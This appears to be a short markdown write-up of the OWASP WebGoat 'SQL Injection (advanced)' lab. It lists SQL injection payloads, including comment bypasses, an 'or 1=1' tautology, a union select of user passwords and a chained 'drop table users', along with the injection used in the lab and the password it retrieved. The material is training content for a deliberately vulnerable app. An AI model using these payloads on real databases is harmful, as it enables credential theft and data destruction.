# SQL Injection (advanced)
Special Characters
```
/* */ 	 are inline comments
-- , # 	 are line comments

Example: Select * from users where name = 'admin' --and pass = 'pass'
```

```
;        allows query chaining

Example: Select * from users; drop table users;
```

```
',+,||	 allows string concatenation
Char()	 strings without quotes

Example: Select * from users where name = '+char(27) or 1=1
```

Special Statements
- Unions	allows overlapping of database tables 'Select id, text from news union all select name, pass from users'

- Joins allows connecting to other tables

## Pulling Data From Other Tables
Code used:
```
Dave' ; select * from user_system_data; --
```

Dave's password:
```
passW0rD
```

![alt text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/3%20pulling%20data%20from%20other%20tables.PNG?token=ANjmpjtrBwt5Xner3U9Ab5iw9YyQ3HF-ks5buFlnwA%3D%3D)
